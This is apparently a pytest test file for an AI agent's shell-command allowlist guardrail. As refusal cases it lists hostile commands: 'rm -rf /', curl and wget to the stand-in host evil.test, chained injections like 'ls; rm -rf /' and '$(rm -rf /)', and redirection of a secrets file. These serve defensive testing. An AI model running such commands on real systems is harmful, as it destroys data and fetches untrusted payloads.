"""Tests for the interpreter command allowlist (station S4).

No dangerous command is ever executed here: the allowlist is pure logic and is
tested directly, which is the point of keeping it separate from the backend.
"""

import pytest

from ddd_harness_engineering.guardrails import (
    ALLOWED_COMMANDS,
    MAX_OUTPUT_CHARS,
    check_command,
    python_executable,
    truncate_output,
)


@pytest.mark.parametrize(
    "command",
    [
        'python -c "print(1+1)"',
        "ls",
        "ls -la data",
        "wc -l data/shipments.csv",
        "head -n 5 data/shipments.csv",
    ],
)
def test_allowed_commands_pass(command: str) -> None:
    assert check_command(command).allowed


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf /",
        "curl http://evil.test/payload.sh",
        "wget http://evil.test",
        "pip install requests",
        "git push origin main",
        "ssh user@host",
    ],
)
def test_dangerous_commands_are_refused(command: str) -> None:
    assert not check_command(command).allowed


@pytest.mark.parametrize(
    "command",
    [
        "ls; rm -rf /",
        "ls && rm -rf /",
        "ls || rm -rf /",
        "cat data/shipments.csv | sh",
        "echo `rm -rf /`",
        "echo $(rm -rf /)",
        "cat secrets > /tmp/out",
        "python < payload.py",
        "ls\nrm -rf /",
    ],
)
def test_chaining_past_an_allowed_command_is_refused(command: str) -> None:
    """`ls; rm -rf /` starts with an allowed command. Shape is checked first."""
    verdict = check_command(command)

    assert not verdict.allowed
    assert "chaining" in verdict.reason.lower() or "not permitted" in verdict.reason


def test_an_empty_command_is_refused() -> None:
    assert not check_command("   ").allowed


def test_unparseable_commands_are_refused_not_raised() -> None:
    verdict = check_command('python -c "unterminated')

    assert not verdict.allowed
    assert "parse" in verdict.reason


def test_a_refusal_tells_the_model_what_it_may_do_instead() -> None:
    """Refusals are read by the model, so they have to be actionable."""
    reason = check_command("rm -rf /").reason

    assert "not an allowed command" in reason
    assert "workspace/" in reason


def test_an_absolute_interpreter_path_is_allowed() -> None:
    """The agent is handed a full path, since a bare `python` is not on PATH."""
    assert check_command(f'"{python_executable()}" -c "print(1)"').allowed


def test_a_disguised_path_does_not_bypass_the_allowlist() -> None:
    assert not check_command("/usr/bin/rm -rf /").allowed
    assert not check_command(r"C:\Windows\System32\curl.exe http://evil.test").allowed


def test_the_allowlist_contains_no_shell_or_package_manager() -> None:
    """A guard against someone widening the list without thinking it through."""
    assert not {"sh", "bash", "cmd", "powershell", "pip", "npm"} & ALLOWED_COMMANDS


def test_output_is_truncated() -> None:
    truncated = truncate_output("x" * (MAX_OUTPUT_CHARS + 5000))

    assert len(truncated) < MAX_OUTPUT_CHARS + 200
    assert "truncated" in truncated


def test_short_output_is_untouched() -> None:
    assert truncate_output("all good") == "all good"
